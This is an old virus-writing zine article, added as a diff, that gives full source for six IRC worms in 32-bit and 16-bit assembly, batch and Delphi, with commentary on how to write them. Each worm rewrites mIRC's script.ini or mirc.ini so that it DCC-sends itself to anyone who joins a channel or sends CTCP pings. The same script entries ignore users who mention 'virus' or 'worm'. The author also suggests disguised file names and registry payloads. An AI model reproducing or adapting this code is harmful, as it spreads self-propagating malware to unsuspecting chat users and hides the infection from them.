@@ -1,0 +1,596 @@
+..o( IRC Worm, easy codin )o..............................[G9N-01.03]..
+:                                                                     :
+: Brief Description: 16 n 32 asm, batch                               :
+: G9N issue Date: May 2000                                            :
+: Author: The Spy                                                     :
+:.....................................................................:
+
+ Some demostrations on how to code simple IRC Worms, fuckin mIRC.
+   __________ ________________________________ __________
+    IWD32.... 32 bit asm......................   8 kb
+    IWD16.... 16 bit asm...................... 452 bytes
+    IWDBAT1.. a batch file without comments... 475 bytes
+    IWDBAT2.. a smaller batch file............ 187 bytes
+    IWDSCR1.. Delphi, usin inifiles...........  72 kb
+    IWDSCR2.. Delphi, not usin inifiles.......  40 kb
+
+___________________________________
+.::::. .::::: .:. .:. ::::. .::::. |.
+::'':: ':.    ::':'::   ':: '' ':: ||.
+::..::  '::.  :: ' :: :::::   .::' ||"
+::''::    ':. ::   ::   .:: .::'   |"
+::  :: :::::' ::   :: ::::' :::::: "
+
+--[IWD32]-------------------------8<-----------------------------------
+
+;]==========================================================================================-
+; IRC.Worm.Demo32
+; >- Uncommented
+; >- Unfinished Optimization, but with optimization comments
+; >- Worm Size: 8k (win32asm :/)
+; >- Werkin Time: dunno exactly, may b minutes 8O (win32asm :\)
+;]==========================================================================================-
+; Coded in 10/04/00 - Bs As - Argentina
+; Bug Fix: 24/04/00, Small Fixes
+; Author: The Spy
+;]==========================================================================================-
+; Things to add:
+; >- May b a mini-compress engine for data, may b not
+; >- Encription for data
+; >- Change Name Randomly, use .scr extension to fuck mirc 5.7
+;]==========================================================================================-
+; To Compile:
+; >- tasm32 /ml IWD32 ,,;
+; >- tlink32 /Tpe /aa /c IWD32 , IWD32 ,, import32,
+;]==========================================================================================-
+
+.386
+locals			; home vs away = local vs visitor, so im local, we play at locals!!
+jumps			; do u like rave ?
+.model flat,STDCALL	; flat n standard, too ugly
+
+extrn	ExitProcess:PROC
+extrn	CloseHandle:PROC
+extrn	SetCurrentDirectoryA:PROC
+extrn	GetCurrentDirectoryA:PROC
+extrn	DeleteFileA:PROC
+extrn	CreateFileA:PROC
+extrn	lstrcpyA:PROC
+extrn	WriteFile:PROC
+extrn	FindFirstFileA:PROC
+extrn	FindClose:PROC
+
+.DATA
+
+FHandle	dd	?
+
+mIRC	db 'C:\mirc',0
+mIRC32	db 'C:\mirc32',0
+ap	db 'C:\archivos de programa\mirc',0
+ap32	db 'C:\archivos de programa\mirc32',0
+pf	db 'C:\program files\mirc',0
+pf32	db 'C:\program files\mirc32',0
+
+autor	db 'The Spy',0		; for AV silly ppl
+worm	db 'IRC.Worm.Demo32',0
+NBtsWrn	dd ?
+counta	db 0
+dir	db 260 dup(0)
+fdata	db 316 dup(0)
+daini	db 'script.ini',0
+dascr	db 'IWD32.scr',0
+script	db '[script]',0,13,10
+n0	db 'n0=ON 1:JOIN:#:{ /if ( $nick != $me ) { /dcc send $nick               ',0
+dir0	db 281 dup(32)
+n1	db 'n1=ON 1:TEXT:*script.ini*:#:/ignore $nick',13,10,0
+n2	db 'n2=ON 1:TEXT:*script.ini*:?:/ignore $nick',13,10,0
+n3	db 'n3=ON 1:TEXT:*infected*:#:/ignore $nick',13,10,0
+n4	db 'n4=ON 1:TEXT:*infected*:?:/ignore $nick',13,10,0
+n5	db 'n5=ON 1:TEXT:*viru*:#:/ignore $nick',13,10,0
+n6	db 'n6=ON 1:TEXT:*viru*:?:/ignore $nick',13,10,0
+n7	db 'n7=ON 1:TEXT:*worm*:#:/ignore $nick',13,10,0
+n8	db 'n8=ON 1:TEXT:*worm*:?:/ignore $nick',13,10,0
+n9	db 'n9=ON 1:TEXT:*IRC.Worm*:#:/ignore $nick',13,10,0
+n10	db 'n10=ON 1:TEXT:*IRC.Worm*:?:/ignore $nick',13,10,0
+n11	db 'n11=ON 1:TEXT:*LBV*:#:/ignore $nick',13,10,0
+n12	db 'n12=ON 1:TEXT:*LBV*:?:/ignore $nick',13,10,0
+n13	db 'n13=ON 1:TEXT:*send*:?:{ /dcc send $nick '
+dir13	db 281 dup(32)
+n14	db 'n14=ctcp 1:*PING*:{ /dcc send $nick      '
+dir14	db 281 dup(32)
+n15	db 'n15=ctcp 1:*FINGER*:{ /dcc send $nick    '
+dir15	db 281 dup(32)
+n16	db 'n16=ctcp 1:*TIME*:{ /dcc send $nick      '
+dir16	db 281 dup(32)
+n17	db 'n17=ctcp 1:*VERSION*:{ /dcc send $nick   '
+dir17	db 281 dup(32)
+n18	db 'n18=ctcp 1:*USERINFO*:{ /dcc send $nick  '
+dir18	db 281 dup(32)
+n19	db 'n19=; IRC.Worm.Demo32 by The Spy',13,10,0
+
+dcc	db ' | /ignore $nick }',13,10,0
+
+.CODE
+
+ChuIsi:
+	call daFFroutine
+	mov [counta],5
+	lea eax,mIRC
+	push eax
+here:
+	call SetCurrentDirectoryA
+	cmp eax,0
+;	jz ChuIsi
+	jnz otroche
+	call daFFroutine
+otroche:
+	cmp [counta],0
+	jz Exit
+	dec [counta]
+	cmp [counta],4
+	jz jmirc32
+	cmp [counta],3
+	jz jap
+	cmp [counta],2
+	jz jap32
+	cmp [counta],1
+	jz jpf
+;jpf32:
+	lea eax,pf32	;if ecx=0 then
+	jmp sip
+jpf:
+	lea eax,pf
+	jmp sip
+jap:
+	lea eax,ap
+	jmp sip
+jap32:
+	lea eax,ap32
+	jmp sip
+jmirc32:
+	lea eax,mIRC32
+sip:
+	push eax
+	jmp here
+
+doda:
+	push eax
+	call FindClose
+	lea eax,dir
+	push eax
+	push 260
+	call GetCurrentDirectoryA
+	cmp eax,0
+	jz Exit
+	lea eax,dir
+	push eax
+	lea eax,dir0
+	push eax
+	call lstrcpyA
+	lea edi,dir0
+	xor eax,eax
+	call a_ver
+	lea eax,dcc
+	push eax
+	push edi
+	call lstrcpyA
+
+;;other:
+
+	lea eax,dir
+	push eax
+	lea eax,dir13
+	push eax
+	call lstrcpyA
+	lea edi,dir13
+	xor eax,eax
+	call a_ver
+	lea eax,dcc
+	push eax
+	push edi
+	call lstrcpyA
+
+	lea eax,dir
+	push eax
+	lea eax,dir14
+	push eax
+	call lstrcpyA
+	lea edi,dir14
+	xor eax,eax
+	call a_ver
+	lea eax,dcc
+	push eax
+	push edi
+	call lstrcpyA
+
+	lea eax,dir
+	push eax
+	lea eax,dir15
+	push eax
+	call lstrcpyA
+	lea edi,dir15
+	xor eax,eax
+	call a_ver
+	lea eax,dcc
+	push eax
+	push edi
+	call lstrcpyA
+
+	lea eax,dir
+	push eax
+	lea eax,dir16
+	push eax
+	call lstrcpyA
+	lea edi,dir16
+	xor eax,eax
+	call a_ver
+	lea eax,dcc
+	push eax
+	push edi
+	call lstrcpyA
+
+	lea eax,dir
+	push eax
+	lea eax,dir17
+	push eax
+	call lstrcpyA
+	lea edi,dir17
+	xor eax,eax
+	call a_ver
+	lea eax,dcc
+	push eax
+	push edi
+	call lstrcpyA
+
+	lea eax,dir
+	push eax
+	lea eax,dir18
+	push eax
+	call lstrcpyA
+	lea edi,dir18
+	xor eax,eax
+	call a_ver
+	lea eax,dcc
+	push eax
+	push edi
+	call lstrcpyA
+
+;;
+;for optimization
+;[word push offset dirxx]+322
+;lea si,lea_edi_dir
+;add word ptr [si],322
+;jnz other
+
+	lea eax,daini
+	push eax
+	call DeleteFileA
+	push 0		; i ve da idea to loop da pushes, but i ve c that Benny ve say that in
+	push 20h	; 29A #4, damn, he was more quick than me... who cares anyway hehe
+	push 1
+	push 0
+	push (1 or 2)
+	push 40000000h
+	lea eax,daini
+	push eax
+	call CreateFileA
+	cmp eax,-1
+	jz Exit
+	mov dword ptr [FHandle],eax
+	push 0
+	push offset NBtsWrn
+	mov ecx,offset dcc-offset script
+	push ecx
+	lea eax,script
+	push eax
+	push dword ptr [FHandle]
+	call WriteFile
+	push dword ptr [FHandle]
+	call CloseHandle
+Exit:
+	push 0
+	call ExitProcess
+
+a_ver:
+	cmp al,byte ptr [edi]
+	jz da
+	inc edi
+	jmp a_ver
+da:
+	ret
+
+daFFroutine:
+	lea eax,fdata
+	push eax
+	lea eax,daini
+	push eax
+	call FindFirstFileA
+	cmp eax,-1
+	jnz doda
+	ret
+
+End ChuIsi
+
+--[IWD32]-------------------------8<-----------------------------------
+
+ It checks for da common directories where mirc use to b installed,
+where it founds a script.ini file, it fuck it constructin da correct
+script for da directory where it must infect. Works fine, infectin da
+first script.ini that it founds in da mirc's common directories.
+
+___________________________________
+.::::. .::::: .:. .:.   ::  .::::. |.
+::'':: ':.    ::':':: .:::  ::'    ||.
+::..::  '::.  :: ' ::   ::  ::.::. ||"
+::''::    ':. ::   ::   ::  ::' ': |"
+::  :: :::::' ::   ::  :::: '::::' "
+
+ Now, let c a 16 bit one, that doesnt make da same things, for eg. it
+infects c:\mirc only, n ve a nasty anti-tracin check included!
+ There is a lot of things that can b added to this worm, like change
+da name, imagine a file called www.clickme.com, nice uh? ;D
+
+--[IWD16]-------------------------8<-----------------------------------
+
+.model tiny
+.code
+	org 100h
+
+IWD16:
+	cmp ax,bx
+	jnz gonp
+	cmp cx,dx
+	jz getout
+gonp:
+	mov ah,3bh
+	lea dx,mircdir
+	int 21h
+	jc getout
+
+	mov ah,3Ch
+	xor cx,cx
+	lea dx,comname
+	int 21h
+
+	xchg ax,bx
+
+	mov ah,40h
+	mov cx,(the_end-IWD16)
+	lea dx,IWD16
+	int 21h
+
+	call closef
+
+	mov ax,3D02h
+	lea dx,scriini
+	int 21h
+	jc getout
+
+	xchg ax,bx
+
+	call seekeof
+
+	xchg dx,ax
+
+	mov ax,4200h
+	sub dx,6
+	int 21h
+
+	mov ah,3Fh
+	mov cx,2
+	lea dx,mircdir
+	int 21h
+
+	mov ax,'ci'
+	cmp word ptr [mircdir],ax
+	je getout
+
+	call seekeof
+
+	mov ah,40h
+	mov cx,the_end-script
+	lea dx,script
+	int 21h
+closef:
+	mov ah,3Eh
+	int 21h
+
+getout:
+	ret
+
+seekeof:
+	mov ax,4202h
+	xor cx,cx
+	cwd
+	int 21h
+	ret
+
+mircdir	db	'c:\mirc\',0
+scriini	db	'script.ini',0
+comname	db	'c:\mirc\IWD16.com',0
+script	db	13,10,'[script]',13,10
+n0	db	'n0=; IRC Worm Demo16 by The Spy',13,10
+n1	db	'n1=ON 1:JOIN:#:{ /if ( $nick != $me )'
+	db	' { /dcc send $nick $mircdirIWD16.com | '
+	db	'/ignore $nick }',13,10
+n2	db	'n2=ON 1:TEXT:*IWD16*:*:/ignore $nick',13,10
+n3	db	'n3=ON 1:TEXT:*Worm*:*:/ignore $nick',13,10
+n4	db	'n4=ON 1:TEXT:*Virus*:*:/ignore $nick',13,10
+n5	db	'n5=ON 1:TEXT:*infect*:*:/ignore $nick',13,10
+zero	db 	0
+
+the_end:
+end IWD16
+
+--[IWD16]-------------------------8<-----------------------------------
+
+___________________________________
+.::::. .::::. :::::: .::::: ::  :: |.
+::  .: ::''::   ::   ::     ::  :: ||.
+:::::. ::..::   ::   ::     :::::: ||"
+::  .: ::''::   ::   ::     ::  :: |"
+:::::' ::  ::   ::   '::::: ::  :: "
+
+ A shitty .bat that works fine (damn god! a few lines of a .bat to
+build a irc worm...)
+
+--[IWDBAT1]-----------------------8<-----------------------------------
+
+::REMove comments to make it 475 bytes small
+ @ctty nul.
+::@ is echo off for da command next to
+ copy /y %0 c:\windows\system\IWDBAT.bat
+ echo n0=; DemoBAT IRC Worm by The Spy>c:\mirc\script.ini
+::> sends output to a file (creates/overwrites da file)
+ echo n1=ON 1:JOIN:#:{ /if ( $nick != $me ) { /dcc send $nick c:\windows\system\IWDBAT.bat }>>c:\mirc\script.ini
+::>> appends output to the end of a file
+ echo n2=ON 1:TEXT:*virus*:*:/ignore $nick>>c:\mirc\script.ini
+ echo n3=ON 1:TEXT:*Worm*:*:/ignore $nick>>c:\mirc\script.ini
+ echo n4=ON 1:TEXT:*.bat*:*:/ignore $nick>>c:\mirc\script.ini
+ echo n5=ON 1:TEXT:*infect*:*:/ignore $nick>>c:\mirc\script.ini
+
+--[IWDBAT1]-----------------------8<-----------------------------------
+
+  n also if u want to save more bytes, chust use da .bat as da ini, its
+a dirty way, but i works. U can make a smaller one, avoidin sign, a
+batch file 188 bytes long, n if u avoid to set ctty nul, u can obtain a
+smaller one, 176 bytes
+
+--[IWDBAT2]-----------------------8<-----------------------------------
+
+@ctty nul.
+@copy /y %0 c:\windows\system\2.bat
+@copy /y %0 c:\mirc\script.ini
+[script]
+n0=ON 1:JOIN:#:{ /if ( $nick != $me ) { /dcc send $nick c:\windows\system\2.bat }
+n1=;The Spy
+
+--[IWDBAT2]-----------------------8<-----------------------------------
+
+_______________________________________
+:::::. .::::. ::     :::::. ::  ::  :: |.
+::  ': ::'':: ::     ::  :: ::  ::  :: ||.
+::   : ::..:' ::     :::::' ::::::  :: ||"
+::  .: ::'    ::     ::     ::  ::  :: |"
+:::::' '::::: '::::: ::     ::  ::  :: "
+
+  It will modify mirc.ini, i know that change pirch's events.ini isnt
+nothin dificult, but i think that 72 k, r enough.
+
+--[DemoSCR Worm using inifiles]---8<-----------------------------------
+
+{
+  DemoSCR Worm by The Spy
+  Version: using inifiles
+  Coded in March 6th of 2000
+  Size: 72 kb
+}
+
+program DemoSCR_Worm_using_inifiles;
+uses sysutils,inifiles;
+var s,v:string;ini:tinifile;
+begin
+s:='DemoSCR Worm';
+s:='The Spy';
+s:=GetCurrentDir; // c:\mirc\download
+chdir('..');
+v:=GetCurrentDir; // eg. c:\mirc
+ini:=tinifile.create(v+'\mirc.ini');
+Ini.WriteString('Text','ignore','*.dll');
+Ini.WriteString('Options','n2','0,1,0,0,1,1,1,1,0,5,35,0,0,1,1,0,1,1,0,5,500,10,0,1,1,0,0');
+Ini.WriteString('Options','n4','1,0,1,1,0,3,9999,0,0,0,1,0,1024,0,0,99,60,0,0,1,1,1,0,1,1,5000,1');
+Ini.WriteString('Script','n0','ON 1:JOIN:#:{ /if ( $nick != $me ) { /dcc send $nick '+s+'\freedemo.scr | /ignore $nick }');
+Ini.WriteString('Script','n1','ON 1:TEXT:*script.ini*:#:/ignore $nick');
+Ini.WriteString('Script','n2','ON 1:TEXT:*script.ini*:?:/ignore $nick');
+Ini.WriteString('Script','n3','ON 1:TEXT:*infect*:#:/ignore $nick');
+Ini.WriteString('Script','n4','ON 1:TEXT:*infect*:?:/ignore $nick');
+Ini.WriteString('Script','n5','ON 1:TEXT:*viru*:#:/ignore $nick');
+Ini.WriteString('Script','n6','ON 1:TEXT:*viru*:?:/ignore $nick');
+Ini.WriteString('Script','n7','ON 1:TEXT:*worm*:#:/ignore $nick');
+Ini.WriteString('Script','n8','ON 1:TEXT:*worm*:?:/ignore $nick');
+Ini.WriteString('Script','n9','ON 1:TEXT:*DemoSCR*:#:/ignore $nick');
+Ini.WriteString('Script','n10','ON 1:TEXT:*DemoSCR*:?:/ignore $nick');
+Ini.WriteString('Script','n11','ON 1:TEXT:*SCR*:#:/ignore $nick');
+Ini.WriteString('Script','n12','ON 1:TEXT:*SCR*:?:/ignore $nick');
+Ini.WriteString('Script','n13','ON 1:TEXT:*send*:*:{ /dcc send $nick '+s+'\freedemo.scr | /ignore $nick }');
+Ini.WriteString('Script','n14','ctcp 1:*PING*:{ /dcc send $nick '+s+'\freedemo.scr | /ignore $nick }');
+Ini.WriteString('Script','n15','ctcp 1:*FINGER*:{ /dcc send $nick '+s+'\freedemo.scr | /ignore $nick | halt }');
+Ini.WriteString('Script','n16','ctcp 1:*TIME*:{ /dcc send $nick '+s+'\freedemo.scr | /ignore $nick }');
+Ini.WriteString('Script','n17','ctcp 1:*VERSION*:{ /dcc send $nick '+s+'\freedemo.scr | /ignore $nick }');
+Ini.WriteString('Script','n18','ctcp 1:*USERINFO*:{ /dcc send $nick '+s+'\freedemo.scr | /ignore $nick | halt }');
+Ini.WriteString('Script','n19','; DemoSCR Worm by The Spy');
+Ini.Free;
+exit;
+end.
+
+--[DemoSCR Worm using inifiles]---8<-----------------------------------
+
+  Damn, 72k r enough n too much, let me code some things.
+
+--[DemoSCR Worm not usin inifiles]8<-----------------------------------
+
+{
+  DemoSCR Worm by The Spy
+  Version: not usin inifiles
+  Coded in March 6th of 2000
+  Size: 42 kb
+}
+
+program DemoSCR_Worm_not_usin_inifiles;
+uses SysUtils;
+var ft:textfile;s,v:string;flag:boolean;
+begin
+flag:=false;
+s:='DemoSCR Worm';
+s:='The Spy';
+s:=GetCurrentDir; // c:\mirc\download
+chdir('..');
+v:=GetCurrentDir; // c:\mirc
+assignfile(ft,v+'\mirc.ini');
+reset(ft);
+repeat
+readln(ft,v);
+if v='[script]' then flag:=true;
+if flag then break;
+until eof(ft);
+append(ft);
+writeln(ft);
+if not flag then writeln(ft,'[script]');
+writeln(ft,'n0=ON 1:JOIN:#:{ /if ( $nick != $me ) { /dcc send $nick '+s+'\freedemo.scr | /ignore $nick }');
+writeln(ft,'n1=ON 1:TEXT:*script.ini*:#:/ignore $nick');
+writeln(ft,'n2=ON 1:TEXT:*script.ini*:?:/ignore $nick');
+writeln(ft,'n3=ON 1:TEXT:*infect*:#:/ignore $nick');
+writeln(ft,'n4=ON 1:TEXT:*infect*:?:/ignore $nick');
+writeln(ft,'n5=ON 1:TEXT:*viru*:#:/ignore $nick');
+writeln(ft,'n6=ON 1:TEXT:*viru*:?:/ignore $nick');
+writeln(ft,'n7=ON 1:TEXT:*worm*:#:/ignore $nick');
+writeln(ft,'n8=ON 1:TEXT:*worm*:?:/ignore $nick');
+writeln(ft,'n9=ON 1:TEXT:*DemoSCR*:#:/ignore $nick');
+writeln(ft,'n10=ON 1:TEXT:*DemoSCR*:?:/ignore $nick');
+writeln(ft,'n11=ON 1:TEXT:*SCR*:#:/ignore $nick');
+writeln(ft,'n12=ON 1:TEXT:*SCR*:?:/ignore $nick');
+writeln(ft,'n13=ON 1:TEXT:*send*:?:{ /dcc send $nick '+s+'\freedemo.scr | /ignore $nick }');
+writeln(ft,'n14=ctcp 1:*PING*:{ /dcc send $nick '+s+'\freedemo.scr | /ignore $nick }');
+writeln(ft,'n15=ctcp 1:*FINGER*:{ /dcc send $nick '+s+'\freedemo.scr | /ignore $nick | halt }');
+writeln(ft,'n16=ctcp 1:*TIME*:{ /dcc send $nick '+s+'\freedemo.scr | /ignore $nick }');
+writeln(ft,'n17=ctcp 1:*VERSION*:{ /dcc send $nick '+s+'\freedemo.scr | /ignore $nick }');
+writeln(ft,'n18=ctcp 1:*USERINFO*:{ /dcc send $nick '+s+'\freedemo.scr | /ignore $nick | halt }');
+writeln(ft,'n19=; DemoSCR Worm by The Spy');
+flush(ft); // b sure
+closefile(ft);
+exit;
+end.
+
+--[DemoSCR Worm not usin inifiles]8<-----------------------------------
+
+  Well, this version, ve no da dcc invisible feature, but i ve save
+30 kb, that is a lot. A lot of things can b added like change it name
+from freedemo.scr to MyNewDemo.scr or demo.scr hehe, or also a search
+routine, to find da mirc's directory, include an icon, etc.
+  But da funny one, may b a payload like change da mIRC's Reg at
+HKEY_USERS\.Default\Software\mIRC\name for eg. simply callin da
+TRegistry.WriteString procedure.
+
+
+ The Spy,
+ an (old, weird, mad, sick n damn) asm coder
